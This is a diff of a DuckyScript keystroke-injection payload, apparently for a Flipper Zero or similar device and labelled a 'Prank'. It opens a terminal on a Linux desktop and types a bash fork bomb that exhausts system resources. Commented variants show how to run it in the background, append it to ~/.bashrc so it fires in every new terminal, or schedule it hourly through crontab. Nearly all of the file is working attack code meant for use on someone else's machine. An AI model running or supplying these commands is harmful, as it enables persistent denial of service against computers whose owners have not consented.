@@ -1,9 +1,22 @@
-REM ForkBomb-Linux
-REM By 7h30th3r0n3
-GUI r
+REM Title: Terminal forkbomb
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04.
+REM Props: Hak5, 7h30th3r0n3 for the initial submission of a simpler version of drapl0n's terminalbomb script, UberGuidoZ for keeping the flipper repo going.
+REM Version: 1.0
+REM Category: Prank
+REM Launches terminal and spawns a terminal forkbomb
+REM
 DELAY 300
-STRING terminal
-ENTER 
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
 DELAY 300
-STRING :(){:|:&};:
+CTRL-ALT t
+DELAY 2000
+STRING :(){ :|:& };:
 ENTER
+REM If you want to do it in the background so you can close the terminal with adding ALT F4
+REM STRING nohup :(){ :|:& };: >> /dev/null &
+REM if you want to do it every time they open a terminal like drapl0n's terminalbomb style
+REM STRING echo ":(){ :|:& };:" >> ~/.bashrc
+REM if you want to make it happen every hour
+REM STRING crontab -l | sed "\$a\@hourly sh :(){ :|:& };:" | crontab -
